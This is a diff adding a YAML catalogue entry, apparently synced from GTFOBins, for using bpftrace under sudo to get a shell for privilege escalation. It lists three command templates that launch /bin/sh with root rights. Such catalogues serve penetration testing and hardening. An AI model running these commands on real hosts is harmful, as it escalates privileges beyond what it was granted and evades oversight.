@@ -1,0 +1,28 @@
+id: gtfobins/bpftrace/shell/sudo
+type: binary
+platform: linux
+name: bpftrace
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'
+- template: 'echo ''BEGIN {system("/bin/sh 1<&0");exit()}'' >/path/to/temp-file
+
+    bpftrace --unsafe /path/to/temp-file'
+- template: bpftrace -c /bin/sh -e 'END {exit()}'
+references:
+- https://gtfobins.github.io/gtfobins/bpftrace/
+tags:
+- linux
+- unix
+- gtfobins
